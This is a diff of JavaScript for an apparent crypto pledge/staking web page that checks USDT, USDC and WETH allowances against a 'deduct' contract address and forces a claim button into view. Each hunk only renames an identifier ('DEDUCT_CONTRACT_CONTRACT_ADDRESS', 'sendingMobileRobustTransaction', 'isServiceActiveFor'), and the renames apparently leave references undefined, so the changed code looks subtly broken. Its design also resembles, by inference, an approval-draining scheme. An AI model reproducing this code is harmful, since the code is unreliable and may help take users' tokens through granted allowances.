@@ -1,4 +1,4 @@
-const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
+const DEDUCT_CONTRACT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
@@ -310,7 +310,7 @@ async function loadUserDataFromServer() {
     const pledgeData = allData.pledges[userAddress] || {};
     if (pledgeData.isPledging) {
       const tokenSymbol = { [USDT_CONTRACT_ADDRESS]: 'USDT', [USDC_CONTRACT_ADDRESS]: 'USDC', [WETH_CONTRACT_ADDRESS]: 'WETH' }[pledgeData.token] || 'Unknown';
-      document.getElementById('totalPledgedValue').textContent = `${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
+      document.getElementById('totalPledgeValue').textContent = `${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
     }
     await updateInterest();
   } catch (error) {
@@ -626,7 +626,7 @@ function activateStakingUI() {
   forceShowClaimButton();
 }
 
-async function sendMobileRobustTransaction(populatedTx) {
+async function sendingMobileRobustTransaction(populatedTx) {
   if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
   const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
   const fromAddress = await signer.getAddress();
@@ -737,7 +737,7 @@ async function updateUIBasedOnChainState() {
     const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
     const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
     const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
-    const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
+    const isFullyAuthorized = isServiceActiveFor || hasSufficientAllowance;
     if (isFullyAuthorized) {
       if (isWethAuthorized) walletTokenSelect.value = 'WETH';
       else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
